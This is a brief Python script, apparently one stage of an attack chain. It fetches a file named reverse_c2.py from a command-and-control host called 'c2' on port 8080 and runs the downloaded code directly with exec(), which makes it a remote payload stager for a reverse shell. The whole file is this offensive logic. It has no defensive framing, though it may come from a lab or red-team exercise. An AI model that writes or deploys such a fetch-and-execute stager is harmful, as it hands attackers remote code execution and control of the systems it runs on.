#!/usr/bin/env python3

from urllib.request import urlopen

RHOST="c2"
RPORT=8080

# Grab script
print("[S3] Executing C2")
url = f"http://{RHOST}:{RPORT}/scripts/remote/reverse_c2.py"
reverse_c2 = urlopen(url).read().decode("utf-8")

# Exec script
exec(reverse_c2)